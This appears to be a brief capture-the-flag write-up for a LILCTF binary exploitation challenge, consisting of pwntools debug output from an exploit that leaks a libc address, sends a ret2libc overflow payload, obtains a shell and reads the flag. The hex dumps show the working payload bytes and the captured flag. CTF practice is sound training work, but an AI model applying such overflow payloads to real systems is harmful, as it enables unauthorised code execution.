# getshell
```
/home/task/2025/08-15-Lil/pwn-checkin/exp.py:43: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
[DEBUG] Received 0x19 bytes:
    00000000  50 ae 52 c1  e5 7f 0a 57  68 61 74 27  73 20 79 6f  │P·R·│···W│hat'│s yo│
    00000010  75 72 20 6e  61 6d 65 3f  0a                        │ur n│ame?│·│
    00000019
[+] libc :-----> 0x7fe5c14aa000
/home/task/2025/08-15-Lil/pwn-checkin/exp.py:47: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  binsh_addr = next(libc.search("/bin/sh"))
[DEBUG] Sent 0x99 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000070  40 48 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │@H@·│····│··@·│····│
    00000080  76 11 40 00  00 00 00 00  78 26 68 c1  e5 7f 00 00  │v·@·│····│x&h·│····│
    00000090  70 ad 4f c1  e5 7f 00 00  0a                        │p·O·│····│·│
    00000099
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[*] Switching to interactive mode
[DEBUG] Received 0x2c bytes:
    b'LILCTF{ea8fa1f2-875a-4601-934a-d24f9780ee60}'
LILCTF{ea8fa1f2-875a-4601-934a-d24f9780ee60}$

```
![](https://r2.20161023.xyz/pic/20250815102743866.png)